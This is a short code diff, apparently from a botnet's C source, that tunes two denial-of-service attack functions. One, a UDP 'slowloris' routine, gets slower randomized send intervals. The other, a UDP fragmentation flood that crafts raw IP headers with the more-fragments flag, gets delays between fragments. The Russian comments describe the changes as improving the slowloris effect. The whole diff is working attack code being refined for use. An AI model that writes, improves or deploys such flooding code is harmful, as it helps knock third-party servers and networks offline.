@@ -17,6 +17,7 @@
 #include <errno.h>
 #include <fcntl.h>
 #include <string.h>
+#include <stdio.h>
 
 #include <stdint.h>
 #include <poll.h>
@@ -1714,7 +1715,8 @@ void attack_slowloris_udp(uint8_t targs_len, struct attack_target *targs, uint8_
                 send(fds[i], payload, len, MSG_NOSIGNAL);
             }
         }
-        usleep(rand_next() % 10000 + 2000);
+        // более медленная отправка для slowloris эффекта
+        usleep(rand_next() % 15000 + 5000);
     }
 
     for (i = 0; i < max_conns; i++)
@@ -1770,6 +1772,10 @@ void attack_udp_frag(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                 // устанавливаем флаг MF (more fragments) для всех кроме последнего
                 int more_frags = (frag < num_fragments - 1) ? 0x2000 : 0;
                 iph->frag_off = htons((offset >> 3) | more_frags);
+                
+                // добавляем небольшую задержку между фрагментами
+                if (frag > 0)
+                    usleep(rand_next() % 1000 + 100);
                 
                 iph->ttl = ip_ttl;
                 iph->protocol = IPPROTO_UDP;
